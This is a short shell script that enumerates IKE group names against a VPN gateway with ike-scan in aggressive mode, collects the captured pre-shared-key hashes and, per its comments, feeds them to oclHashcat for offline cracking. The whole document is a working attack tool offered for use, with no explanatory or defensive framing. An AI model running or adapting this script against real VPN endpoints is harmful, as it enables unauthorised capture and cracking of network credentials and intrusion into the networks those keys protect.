#!/bin/sh
# Run this script and redirect the output to a file. Then run the following
# oclHashcat command to attempt to crack the passwords:
#
# ./oclHashcat -m 5400 --username <output_file> dictionary rules
#
# You will need to modify the group id file name and IP address as necessary.
GID='/root/Software/ikeforce/wordlists/groupnames.dic'
IP=''

for g in $(cat "$GID"); do
    file="psk-$g.txt"
    output=$(ike-scan -A --id $g -P$file $IP);
    sleep 1;

    if [ -f "$file" ]; then
        psk=$(cat $file);
        echo "$g:$psk";
        rm $file;
    fi;
done;
